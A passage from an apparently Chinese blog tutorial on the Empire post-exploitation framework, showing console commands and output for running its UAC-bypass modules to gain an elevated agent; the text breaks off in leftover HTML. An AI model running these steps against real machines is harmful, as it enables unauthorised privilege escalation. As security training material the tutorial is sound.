</span></span></code></pre></td></tr></table></div></div><h2 id=0x04-使用模块>0x04 使用模块</h2><h3 id=bypass-uac>Bypass UAC</h3><p>常用的有以下模块：</p><ul><li>powershell/privesc/bypassuac</li><li>powershell/privesc/bypassuac_env</li><li>powershell/privesc/bypassuac_eventvwr</li><li>powershell/privesc/bypassuac_fodhelper</li><li>powershell/privesc/bypassuac_sdctlbypass</li><li>powershell/privesc/bypassuac_tokenmanipulation</li><li>powershell/privesc/bypassuac_wscript</li></ul><p>也可以直接这么使用：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>(Empire: agents) &gt; interact MYZBFLEX
</span></span><span style=display:flex><span>(Empire: MYZBFLEX) &gt; bypassuac
</span></span></code></pre></td></tr></table></div></div><p>但是默认的bypassuac是使用的<code>bypassuac_eventvwr</code>，这时候就需要调用其他的了
。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">38
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">39
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">40
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">41
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">42
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">43
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">44
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">45
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">46
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">47
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">48
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">49
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">50
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">51
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>(Empire: MYZBFLEX) &gt; usemodule privesc/bypassuac_fodhelper 
</span></span><span style=display:flex><span>(Empire: powershell/privesc/bypassuac_fodhelper) &gt; info
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>              Name: Invoke-FodHelperBypass
</span></span><span style=display:flex><span>            Module: powershell/privesc/bypassuac_fodhelper
</span></span><span style=display:flex><span>        NeedsAdmin: False
</span></span><span style=display:flex><span>         OpsecSafe: False
</span></span><span style=display:flex><span>          Language: powershell
</span></span><span style=display:flex><span>MinLanguageVersion: 2
</span></span><span style=display:flex><span>        Background: True
</span></span><span style=display:flex><span>   OutputExtension: None
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Authors:
</span></span><span style=display:flex><span>  Petr Medonos
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Description:
</span></span><span style=display:flex><span>  Bypasses UAC by performing an registry modification for
</span></span><span style=display:flex><span>  FodHelper (based onhttps://winscripting.blog/2017/05/12
</span></span><span style=display:flex><span>  /first-entry-welcome-and-uac-bypass/)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Comments:
</span></span><span style=display:flex><span>  https://winscripting.blog/2017/05/12/first-entry-welcome-
</span></span><span style=display:flex><span>  and-uac-bypass/
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Options:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  Name       Required    Value                     Description
</span></span><span style=display:flex><span>  ----       --------    -------                   -----------
</span></span><span style=display:flex><span>  Listener   True                                  Listener to use.                        
</span></span><span style=display:flex><span>  UserAgent  False       default                   User-agent string to use for the staging
</span></span><span style=display:flex><span>                                                   request (default, none, or other).      
</span></span><span style=display:flex><span>  Proxy      False       default                   Proxy to use for request (default, none,
</span></span><span style=display:flex><span>                                                   or other).                              
</span></span><span style=display:flex><span>  Agent      True        MYZBFLEX                  Agent to run module on.                 
</span></span><span style=display:flex><span>  ProxyCreds False       default                   Proxy credentials                       
</span></span><span style=display:flex><span>                                                   ([domain\]username:password) to use for 
</span></span><span style=display:flex><span>                                                   request (default, none, or other).      
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>(Empire: powershell/privesc/bypassuac_fodhelper) &gt; set Listener hello
</span></span><span style=display:flex><span>(Empire: powershell/privesc/bypassuac_fodhelper) &gt; execute
</span></span><span style=display:flex><span>[&gt;] Module is not opsec safe, run? [y/N] y
</span></span><span style=display:flex><span>[*] Tasked MYZBFLEX to run TASK_CMD_JOB
</span></span><span style=display:flex><span>[*] Agent MYZBFLEX tasked with task ID 2
</span></span><span style=display:flex><span>[*] Tasked agent MYZBFLEX to run module powershell/privesc/bypassuac_fodhelper
</span></span><span style=display:flex><span>(Empire: powershell/privesc/bypassuac_fodhelper) &gt; [*] Agent MYZBFLEX returned results.
</span></span><span style=display:flex><span>Job started: 9HABCE
</span></span><span style=display:flex><span>[*] Valid results returned by 192.168.117.179
</span></span><span style=display:flex><span>[*] Sending POWERSHELL stager (stage 1) to 192.168.117.179
</span></span><span style=display:flex><span>[*] New agent VZWXYL4T checked in
</span></span><span style=display:flex><span>[+] Initial agent VZWXYL4T from 192.168.117.179 now active (Slack)
</span></span><span style=display:flex><span>[*] Sending agent (stage 2) to VZWXYL4T at 192.168.117.179
</span></span></code></pre></td></tr></table></div></div><p><img src=https://images.payloads.online/3dfd0a00-4f5f-11ec-84ec-00d861bf4abb.jpg alt=20fb5ad72cd8b7ba728b8d0be7d08c87.png></p><p>此时<code>agents</code>列表如下：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>(Empire: powershell/privesc/bypassuac_fodhelper) &gt; agents
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>[*] Active agents:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span> Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen
</span></span><span style=display:flex><span> ----     -- -----------     ------------      --------                -------            ---    -----    ---------
</span></span><span style=display:flex><span> MYZBFLEX ps 192.168.117.179 DESKTOP-7KT7GL1   DESKTOP-7KT7GL1\Rvn0xsy powershell         7256   5/0.0    2018-12-18 02:22:26
</span></span><span style=display:flex><span> VZWXYL4T ps 192.168.117.179 DESKTOP-7KT7GL1   *DESKTOP-7KT7GL1\Rvn0xs powershell         9392   5/0.0    2018-12-18 02:22:26
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>(Empire: agents) &gt; 
</span></span></code></pre></td></tr></table></div></div><p>计算机名前带有<code>*</code>的<code>agents</code>才可以使用<code>*</code>结尾的模块：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 38
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 39
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 40
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 41
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 42
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 43
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 44
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 45
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 46
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 47
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 48
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 49
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 50
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 51
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 52
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 53
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 54
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 55
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 56
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 57
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 58
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 59
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 60
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 61
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 62
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 63
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 64
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 65
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 66
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 67
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 68
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 69
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 70
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 71
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 72
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 73
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 74
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 75
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 76
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 77
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 78
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 79
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 80
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 81
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 82
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 83
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 84
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 85
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 86
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 87
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 88
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 89
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 90
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 91
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 92
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 93
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 94
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 95
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 96
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 97
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 98
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 99
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">100
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">101
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">102
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">103
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">104
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">105
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">106
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">107
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">108
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">109
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">110
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">111
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">112
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">113
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">114
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">115
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">116
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">117
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">118
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">119
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">120
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">121
